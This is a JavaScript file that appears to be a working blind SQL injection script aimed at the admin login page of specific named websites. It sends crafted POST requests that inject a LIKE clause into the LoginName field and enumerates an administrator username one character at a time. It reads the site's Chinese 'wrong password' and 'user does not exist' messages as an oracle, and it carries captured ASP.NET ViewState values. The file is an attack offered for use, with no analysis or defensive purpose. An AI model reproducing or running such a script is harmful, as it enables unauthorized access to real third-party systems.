function CallAjax(info) {
    info.type = info.type === undefined ? "GET" : info.type;
    info.getResult = info.getResult === undefined ? () => { } : info.getResult;
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open(info.type, info.url, true);
    if (info.contentType) {
        xmlhttp.setRequestHeader("Content-Type", info.contentType);
    }
    for (var i in info.header) {
        xmlhttp.setRequestHeader(info.header[i].key, info.header[i].value);
    }
    xmlhttp.send(info.data);
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState === 4) {
            info.getResult(xmlhttp);
            info.success(xmlhttp.responseText);
        }
    };
}
document.cookie = "CheckCode=";
var strList = "0123456789abcdefghijklmnopqrstuvwxyz";
var saveStr = '';
var len = 4;
//var domain = "http://www.bj3zhx.org";
var domain = 'http://www.conking.cn';
//var domain = 'http://www.bjqysy.org';
var url = domain + "/admin/index.aspx";
//use Fiddler to capture your own data
var dataStr = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEzMTY1ODU2OTVkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBRBSZW1lbWJlclBhc3N3b3JkBQZTdWJtaXQA0cbMJl4ysgJB7vGHEADcEAZe%2BA%3D%3D&__EVENTVALIDATION=%2FwEWBwK6jNeOBwLM2PtaAs7ji7UNAqnG0ZQEArWb7cUPAt%2Fti8wLArzDhLYE1QwidmE%2FotHvMGHIWq%2BYiqTya9s%3D";
function Run(index) {
    var currentChar = strList[index];
    var unknownStr = '';
    for (var i = 0; i < len - 1 - saveStr.length; i++) {
        unknownStr += "_";
    }
    
    CallAjax({
        url: url,
        type: "POST",
        contentType: "application/x-www-form-urlencoded",
        data: dataStr + "&LoginName=' or  LoginName like'" + saveStr + currentChar + unknownStr + "' and Loginpassword='1435c9fd883688340cdaf48a1a04d701&LoginPassword=222&LoginForced=true&RememberLoginPassword=&Submit.x=84&Submit.y=4",
        success: function (result) {
            if (result.indexOf("密码错误") !== -1) {
                console.log("密码错误");
                saveStr += currentChar;
                console.log(saveStr);
                Run(0);
            }
            else {
                console.log("用户不存在");
                if (index === strList.length - 1) {
                    console.log("done");
                    console.log(saveStr);
                }
                else {
                    Run(++index);
                }
            }
        }
    });
}
Run(0);
